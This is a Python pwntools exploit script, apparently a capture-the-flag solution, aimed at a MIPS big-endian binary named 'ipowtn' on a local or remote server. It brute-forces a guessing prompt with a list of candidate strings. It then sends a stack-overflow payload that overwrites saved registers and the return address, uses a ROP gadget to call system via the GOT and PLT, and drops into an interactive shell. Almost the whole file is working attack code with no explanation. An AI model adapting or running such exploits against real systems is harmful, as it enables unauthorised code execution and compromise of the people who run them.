#coding: utf-8
from pwn import *
import sys

LOCAL = True
context.arch = 'mips'
context.endian = 'big'

sysshell = 0x400A9C
if LOCAL:
    elf = ELF("./ipowtn")
    #io = remote("10.211.55.3", 22333)
    io = remote("127.0.0.1", 22333)
    #context.log_level = True
else:
    io = remote("106.75.64.188", 18067)
    #context.log_level = True

guesslist = ["nomal", "arch", "bcz", "W3Are", "We", "are", "grad", "from"]

for c in range(11, 0x100):
    guesslist.append("hakker"+chr(c)+"h")
for c in range(22, 0x100):
    guesslist.append("hakker"+chr(c)+"d")

#context.log_level = 'debug'
#pause()
flg_success = 0
timesp = 0
def guessn():
    global flg_success
    global timesp
    if timesp > 20000:
        io.close()
        sys.exit(0)
    for gstr in guesslist:
        #print "testing", gstr
        if len(gstr) >= 8:
            #pause()
            io.send(gstr)
        else:
            io.sendline(gstr)
        try:
            data = io.recvline(timeout=0.1)
            timesp += 1
            #data = io.recvline()
            if len(data) > 5 and "guess it!!!!!!" in data:
                continue
            elif len(data) >= 1 and len(data)<=4:
                log.success("guess over!!!!!!!!!!")
                return 1
            else:
                flg_success += 1
                log.success("ok is "+gstr)
                if flg_success >= 9:
                    return 1
                else:
                    return 0
        except:
            return 0
        finally:
            pass

log.info("starting guess")
while True:
    #pause()
    if guessn() == 1:
        break

io.recvuntil("... go!\n")
payload = 0x20*chr(0)
payload += p32(0x411420)    # fp
payload += p32(0x401224)
payload += 'b'*0x24
# s0 s1 s2 s3 s4 s5 ra
#payload += p32(0) + p32(0x411438) + p32(1) + p32(0x401320) + p32(0) + p32(0)
# system got
payload += p32(0) + p32(0x41144C) + p32(1) + p32(0x401320) + p32(0) + p32(0)
# 0x00401200: lw $t9, ($s1); addiu $s0, $s0, 1; move $a0, $s3; move $a1, $s4; jalr $t9;
payload += p32(0x00401200)  # ra
payload += 0x34*chr(0)
payload += p32(0x400840)    # plt system
pause()
io.sendline(payload)
pause()
io.interactive()


